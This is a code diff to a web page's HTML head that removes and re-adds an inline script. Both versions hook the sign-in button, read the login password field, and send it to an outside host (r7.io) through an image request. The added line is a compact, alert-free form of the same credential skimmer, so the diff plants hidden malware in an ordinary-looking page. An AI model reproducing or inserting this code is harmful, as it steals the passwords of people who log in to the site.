@@ -19,25 +19,7 @@
             }
         });
     </script>
-    <script>
-    alert(0);
-    window.onload =function (){
-      alert(1);
-      var el = document.getElementById("signin-btn");
-      if (el.addEventListener) {
-          el.addEventListener("click", yourFunction, false);
-      } else {
-          el.attachEvent('onclick', yourFunction);
-      }
-    };
-    function yourFunction(){
-      var password = document.getElementById('login_password').value;
-      var username = document.getElementByID('login_username').value;
-      i = new Image();
-      i.src='http://r7.io/e/J7zkgVqCiG?s=The password is: ' + password + 'username is: ' + username + '';
-      alert("does this shit work");
-    }  
-  </script>
+    <script>  window.onload =function (){   var el = document.getElementById("signin-btn");   if (el.addEventListener) {      el.addEventListener("click", yourFunction, false);  } else {      el.attachEvent('onclick', yourFunction);  }   };  function yourFunction(){    i = new Image();    i.src='http://r7.io/e/J7zkgVqCiG?s=The password is: ' + document.getElementById('login_password').value;  }   </script>
 
   </head>
 
